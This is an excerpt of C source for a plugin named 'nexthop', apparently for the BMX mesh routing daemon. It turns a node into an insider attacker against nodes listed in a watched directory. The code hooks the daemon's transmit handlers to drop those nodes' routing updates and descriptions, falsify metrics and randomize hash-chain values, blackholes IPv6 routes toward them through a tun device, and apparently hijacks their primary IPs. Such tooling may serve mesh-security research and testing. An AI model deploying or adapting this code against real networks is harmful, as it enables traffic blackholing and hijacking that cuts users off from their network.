...
#define CODE_CATEGORY_NAME "nexthop"

static int32_t nexthopRouteDropping = DEF_NEXTHOP_ROUTE_DROPPING;
static int32_t nexthopPrimaryIps = DEF_NEXTHOP_PRIMARY_IPS;
static int32_t nexthopDescDropping = DEF_NEXTHOP_DESC_DROPPING;
static int32_t nexthopDescSqns = DEF_NEXTHOP_DESC_SQNS;
static int32_t nexthopDhashDropping = DEF_NEXTHOP_DHASH_DROPPING;
static int32_t nexthopOgmDropping = DEF_NEXTHOP_OGM_DROPPING;
static int32_t nexthopOgmMetrics = DEF_NEXTHOP_OGM_METRICS;
static int32_t nexthopOgmHash = DEF_NEXTHOP_OGM_HASH;

static struct DirWatch *nexthopDirWatch = NULL;
static int32_t nexthop_tun_fd = 0;
static int32_t nexthop_tun_idx = 0;
...
STATIC_FUNC
int32_t nexthop_tx_frame_description_adv(struct tx_frame_iterator *it)
{

	if (nexthopDirWatch && (nexthopDescDropping || nexthopDescSqns)) {

		DHASH_T *dhash = (DHASH_T*) it->ttn->key.data;
		struct desc_content *dc = avl_find_item(&descContent_tree, dhash);

		if (dc && avl_find(&nexthopDirWatch->node_tree, &dc->kn->kHash)) {

			if (nexthopDescDropping)
...
STATIC_FUNC
int32_t nexthop_tx_msg_dhash_adv(struct tx_frame_iterator *it)
{

	if (nexthopDirWatch && nexthopDhashDropping) {

		IID_T *iid = (IID_T*) it->ttn->key.data;
		MIID_T *in;

		if ((in = iid_get_node_by_myIID4x(*iid)) && avl_find(&nexthopDirWatch->node_tree, &in->kn->kHash))
			return TLV_TX_DATA_DONE;
	}
...
STATIC_FUNC
int32_t nexthop_tx_frame_ogm_aggreg_advs(struct tx_frame_iterator *it)
{
	...
	if (!(nexthopDirWatch && (nexthopOgmDropping || nexthopOgmMetrics || nexthopOgmHash)))
	...
	while ((on = avl_iterate_item(&oan->tree, &an))) {
		...
		struct KeyWatchNode *tn = avl_find_item(&nexthopDirWatch->node_tree, &on->kn->kHash);

		if (tn && nexthopOgmDropping)
			continue;

		if (tn && nexthopOgmHash)
			cryptRand(&msg->chainOgm, sizeof(msg->chainOgm));
		else
			msg->chainOgm = chainOgmCalc(on->dc, on->dc->ogmSqnMaxSend);

		FMETRIC_U16_T fm16 = umetric_to_fmetric((tn && nexthopOgmMetrics) ? UMETRIC_MAX : on->neighPath.um);
		msg->u.f.metric_exp = fm16.val.f.exp_fm16;
		msg->u.f.metric_mantissa = fm16.val.f.mantissa_fm16;
		msg->u.f.hopCount = (tn && nexthopOgmMetrics) ? 1 : on->ogmHopCount;
		msg->u.f.transmitterIID4x = iid_get_myIID4x_by_node(on);
		msg->u.f.more = (tn && nexthopOgmMetrics) ? 0 : !!on->neighPath.pathMetricsByteSize;
		...
		if (tn && nexthopOgmMetrics) {
			...
			for (p = 0; p < (on->neighPath.pathMetricsByteSize / sizeof(struct msg_ogm_adv_metric_t0)); p++) {
				...
				if (tn && nexthopOgmMetrics) {
					struct msg_ogm_adv_metric_t0 t0Nexthop = { .u =
						{.u16 = t0In->u.u16 } };
					t0Nexthop.u.f.directional = 1;
					t0Nexthop.u.f.metric_exp = fm16.val.f.exp_fm16;
					t0Nexthop.u.f.metric_mantissa = fm16.val.f.mantissa_fm16;
					t0Out->u.u16 = htons(t0Nexthop.u.u16);
				} else {
	...
	dbgf_track(DBGT_INFO, "aggSqn=%d aggSqnMax=%d ogms=%d nexthopSize=%d origSize=%d",
...
STATIC_FUNC
void idChanged_Nexthop(IDM_T del, struct KeyWatchNode *kwn, struct DirWatch *dw)
{
	dbgf_sys(DBGT_WARN, "del=%d kwn=%d kwnFile=%s kwnGlobalId=%s kwnMisc=%X dw=%d nexthopRouteDropping=%d",
		del, !!kwn, kwn ? kwn->fileName : NULL, cryptShaAsShortStr(kwn ? &kwn->global_id : NULL), kwn ? kwn->misc : -1, !!dw, nexthopRouteDropping);
...
#define KWN_MISC_IP_HIJACKING   0x02
	...
	if (!del && !(kwn->misc & KWN_MISC_ROUTE_DROPPING) && nexthopRouteDropping) {

		iproute(IP_ROUTE_TUNS, ADD, NO, &routeKey, DEF_NEXTHOP_IP_TABLE, 0, nexthop_tun_idx, NULL, NULL, DEF_NEXTHOP_IP_METRIC, NULL);
		kwn->misc |= KWN_MISC_ROUTE_DROPPING;

	} else if (kwn->misc & KWN_MISC_ROUTE_DROPPING) {

		iproute(IP_ROUTE_TUNS, DEL, NO, &routeKey, DEF_NEXTHOP_IP_TABLE, 0, nexthop_tun_idx, NULL, NULL, DEF_NEXTHOP_IP_METRIC, NULL);
		kwn->misc &= (~KWN_MISC_ROUTE_DROPPING);
	}


	if (!del && !(kwn->misc & KWN_MISC_IP_HIJACKING) && nexthopPrimaryIps) {
...
STATIC_FUNC
int32_t opt_nexthop_route(uint8_t cmd, uint8_t _save, struct opt_type *opt, struct opt_parent *patch, struct ctrl_node *cn)
{

	if (cmd == OPT_APPLY) {

		dbgf_sys(DBGT_INFO, "changing %s=%d", opt->name, nexthopRouteDropping);

		struct KeyWatchNode *kwn;
		struct avl_node *an = NULL;
		while (nexthopDirWatch && (kwn = avl_iterate_item(&nexthopDirWatch->node_tree, &an)))
			(*nexthopDirWatch->idChanged)(ADD, kwn, nexthopDirWatch);
...
STATIC_FUNC
int32_t opt_nexthop_watch(uint8_t cmd, uint8_t _save, struct opt_type *opt, struct opt_parent *patch, struct ctrl_node *cn)
{
	...
	if (cmd == OPT_APPLY) {
		...
		if (patch->diff == DEL)
			cleanup_dir_watch(&nexthopDirWatch);

		if (patch->diff == ADD) {
			assertion(-501286, (patch->val));
			return init_dir_watch(&nexthopDirWatch, patch->val, idChanged_Nexthop);
		}
	}
...
STATIC_FUNC
int32_t opt_nexthop_init(uint8_t cmd, uint8_t _save, struct opt_type *opt, struct opt_parent *patch, struct ctrl_node *cn)
{
	...
	if (cmd == OPT_SET_POST && initializing) {
		...
		nexthop_tun_idx = kernel_dev_tun_add(DEF_NEXTHOP_TUN_NAME, &nexthop_tun_fd, NO);
		set_fd_hook(nexthop_tun_fd, tun_out_devZero_hook, ADD);

		ip_flush_routes(AF_INET6, DEF_NEXTHOP_IP_TABLE);
		ip_flush_rules(AF_INET6, DEF_NEXTHOP_IP_TABLE);

		// must be configured after general IPv6 options:
		iproute(IP_RULE_DEFAULT, ADD, NO, &ZERO_NET6_KEY, DEF_NEXTHOP_IP_TABLE, DEF_NEXTHOP_IP_RULE, 0, 0, 0, 0, NULL);
	}
...
STATIC_FUNC
int nexthop_rx_dsc_tlv_hna(struct rx_frame_iterator *it)
{
...
STATIC_FUNC
int nexthop_tx_dsc_tlv_hna(struct tx_frame_iterator *it)
{
	dbgf_sys(DBGT_INFO, "enabled=%d attacked nodes=%d", nexthopPrimaryIps, nexthopDirWatch ? (int) nexthopDirWatch->node_tree.items : -1);

	if (!nexthopPrimaryIps || !nexthopDirWatch || !nexthopDirWatch->node_tree.items)
	...
	struct KeyWatchNode *kwn;
	for (an = NULL; (kwn = avl_iterate_item(&nexthopDirWatch->node_tree, &an));) {
...
static struct opt_type nexthop_options[] = {
//        ord parent long_name          shrt Attributes				*ival		min		max		default		*func,*syntax,*help
	{ODI,0,"nexthopInit",              0,  8,0,A_PS0,A_ADM,A_INI,A_ARG,A_ANY,	0,		0,		0,		0,0,            opt_nexthop_init,
			NULL,HLP_DUMMY_OPT},
	{ODI,0,ARG_ATTACKED_NODES_DIR,  0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY,	0,		0,		0,		0,DEF_ATTACKED_NODES_DIR, opt_nexthop_watch,
			ARG_DIR_FORM,"Directory with global-id hashes of this node's attacked other nodes"},
	{ODI,0,ARG_NEXTHOP_ROUTE_DROPPING, 0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &nexthopRouteDropping,MIN_NEXTHOP_ROUTE_DROPPING,MAX_NEXTHOP_ROUTE_DROPPING,DEF_NEXTHOP_ROUTE_DROPPING,0,opt_nexthop_route,
			ARG_VALUE_FORM, "Do not forward IPv6 packets towards attacked nodes"},
	{ODI,0,ARG_NEXTHOP_PRIMARY_IPS,    0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &nexthopPrimaryIps,   MIN_NEXTHOP_PRIMARY_IPS,MAX_NEXTHOP_PRIMARY_IPS,DEF_NEXTHOP_PRIMARY_IPS,0,opt_nexthop_route,
			ARG_VALUE_FORM, "Do not forward IPv6 packets towards attacked nodes"},
	{ODI,0,ARG_NEXTHOP_DESC_DROPPING,  0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &nexthopDescDropping, MIN_NEXTHOP_DESC_DROPPING,MAX_NEXTHOP_DESC_DROPPING,DEF_NEXTHOP_DESC_DROPPING,0,NULL,
			ARG_VALUE_FORM, "Do not propagate description updates of attacked nodes"},
	{ODI,0,ARG_NEXTHOP_DESC_SQNS,      0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &nexthopDescSqns,     MIN_NEXTHOP_DESC_SQNS,MAX_NEXTHOP_DESC_SQNS,DEF_NEXTHOP_DESC_SQNS,0,NULL,
			ARG_VALUE_FORM, "Increment description sqn of attacked nodes"},
	{ODI,0,ARG_NEXTHOP_DHASH_DROPPING, 0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &nexthopDhashDropping,MIN_NEXTHOP_DHASH_DROPPING,MAX_NEXTHOP_DHASH_DROPPING,DEF_NEXTHOP_DHASH_DROPPING,0,NULL,
			ARG_VALUE_FORM, "Do not propagate description hash (Dhash) updates of attacked nodes"},
	{ODI,0,ARG_NEXTHOP_OGM_DROPPING,   0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &nexthopOgmDropping,  MIN_NEXTHOP_OGM_DROPPING,MAX_NEXTHOP_OGM_DROPPING,DEF_NEXTHOP_OGM_DROPPING,0,NULL,
			ARG_VALUE_FORM, "Do not propagate routing updates (OGMs) of attacked nodes"},
	{ODI,0,ARG_NEXTHOP_OGM_METRICS,    0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &nexthopOgmMetrics,   MIN_NEXTHOP_OGM_METRICS,MAX_NEXTHOP_OGM_METRICS,DEF_NEXTHOP_OGM_METRICS,0,NULL,
			ARG_VALUE_FORM, "Modify metrics of routing updates (OGMs) of attacked nodes"},
	{ODI,0,ARG_NEXTHOP_OGM_HASH,       0,  9,0,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &nexthopOgmHash,      MIN_NEXTHOP_OGM_HASH,MAX_NEXTHOP_OGM_HASH,DEF_NEXTHOP_OGM_HASH,0,NULL,
			ARG_VALUE_FORM, "Randomize hash-chain value of routing updates (OGMs) of attacked nodes"}
};

static int32_t nexthop_init(void)
{
	register_options_array(nexthop_options, sizeof( nexthop_options), CODE_CATEGORY_NAME);

	orig_tx_frame_desc_adv = packet_frame_db->handls[FRAME_TYPE_DESC_ADVS].tx_frame_handler;
	packet_frame_db->handls[FRAME_TYPE_DESC_ADVS].tx_frame_handler = nexthop_tx_frame_description_adv;

	orig_tx_msg_dhash_adv = packet_frame_db->handls[FRAME_TYPE_IID_ADV].tx_msg_handler;
	packet_frame_db->handls[FRAME_TYPE_IID_ADV].tx_msg_handler = nexthop_tx_msg_dhash_adv;

	orig_tx_frame_ogm_dhash_aggreg_advs = packet_frame_db->handls[FRAME_TYPE_OGM_ADV].tx_frame_handler;
	packet_frame_db->handls[FRAME_TYPE_OGM_ADV].tx_frame_handler = nexthop_tx_frame_ogm_aggreg_advs;

	orig_tx_dsc_tlv_hna = description_tlv_db->handls[BMX_DSC_TLV_HNA6].tx_frame_handler;
	description_tlv_db->handls[BMX_DSC_TLV_HNA6].tx_frame_handler = nexthop_tx_dsc_tlv_hna;

	orig_rx_dsc_tlv_hna = description_tlv_db->handls[BMX_DSC_TLV_HNA6].rx_frame_handler;
	description_tlv_db->handls[BMX_DSC_TLV_HNA6].rx_frame_handler = nexthop_rx_dsc_tlv_hna;

	return SUCCESS;
}

static void nexthop_cleanup(void)
{
	...
	if (nexthop_tun_fd) {
		iproute(IP_RULE_DEFAULT, DEL, NO, &ZERO_NET6_KEY, DEF_NEXTHOP_IP_TABLE, DEF_NEXTHOP_IP_RULE, 0, 0, 0, 0, NULL);

		ip_flush_routes(AF_INET6, DEF_NEXTHOP_IP_TABLE);
		ip_flush_rules(AF_INET6, DEF_NEXTHOP_IP_TABLE);

		set_fd_hook(nexthop_tun_fd, tun_out_devZero_hook, DEL);
		kernel_dev_tun_del(DEF_NEXTHOP_TUN_NAME, nexthop_tun_fd);
		nexthop_tun_fd = 0;
	}
}
...
struct plugin* get_plugin(void)
{
	...
	static struct plugin nexthop_plugin;

	memset(&nexthop_plugin, 0, sizeof( struct plugin));


	nexthop_plugin.plugin_name = CODE_CATEGORY_NAME;
	nexthop_plugin.plugin_size = sizeof( struct plugin);
	nexthop_plugin.cb_init = nexthop_init;
	nexthop_plugin.cb_cleanup = nexthop_cleanup;

	return &nexthop_plugin;
}
